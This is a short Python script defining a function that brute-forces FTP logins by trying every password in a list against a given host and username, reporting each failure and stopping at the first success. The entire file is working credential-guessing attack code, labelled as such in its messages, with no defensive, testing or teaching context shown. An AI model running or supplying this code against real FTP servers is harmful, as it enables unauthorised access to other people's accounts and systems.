import ftplib

def brute_force_ftp(host, username, password_list):
    print(f"🔐 Starting brute-force attack on {host} with username '{username}'...")
    for password in password_list:
        password = password.strip()
        try:
            ftp = ftplib.FTP(host)
            ftp.login(user=username, passwd=password)
            print(f"✅ Login successful: {username}:{password}")
            ftp.quit()
            return
        except ftplib.error_perm:
            print(f"❌ Failed: {username}:{password}")
        except Exception as e:
            print(f"⚠️ Error: {e}")
    print("🚫 Brute-force attempt completed. No valid password found.")